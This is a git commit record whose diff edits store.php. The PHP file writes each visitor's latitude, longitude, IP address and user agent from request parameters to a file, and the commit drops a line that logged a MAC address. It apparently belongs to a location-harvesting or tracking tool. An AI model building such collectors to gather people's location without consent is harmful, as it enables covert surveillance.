705b9194230de1bca74131f72199cb1a2c0fe16b
cyber08jk <jk.cyber2325@gmail.com>
2024-08-25 08:21:15 +0530

    changed

--- store.php
+++ store.php
@@ -4,7 +4,6 @@ $txt = "lat: " . $_GET["lat"] . "\n";
 $txt .= "long: " . $_GET["long"] . "\n";
 $txt .= "IP: " . $_SERVER["REMOTE_ADDR"] . "\n";
 $txt .= "User agent: " . $_GET["uagent"] . "\n";
-$txt .= "User MAC: " . $_GET["mac"] . "\n";
 fwrite($myfile, $txt);
 fclose($myfile);
 ?>
